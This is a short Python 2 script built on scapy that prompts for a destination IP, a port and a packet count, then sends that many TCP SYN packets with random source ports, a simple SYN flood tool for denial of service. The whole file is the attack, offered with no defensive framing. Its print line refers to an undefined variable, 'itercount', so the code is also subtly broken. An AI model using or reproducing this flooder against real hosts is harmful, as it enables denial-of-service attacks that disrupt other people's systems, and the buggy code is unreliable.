import sys
import random
from scapy.all import *
import os
import urllib2

if os.getuid() != 0:
	print ("Must be run as root.")
	sys.exit(1)

source = raw_input("Enter destination ip: ")
port = input("Enter a port: ")
count = input("Enter the amount of SYN's: ")
itcount = 0

while itcount < int(count):
	a =IP(dst=source)/TCP(flags="S", sport=RandShort(), dport=int(port))
	send (a, verbose=0)
	itcount += 1
	print (str(itercount) + " Packets sent")
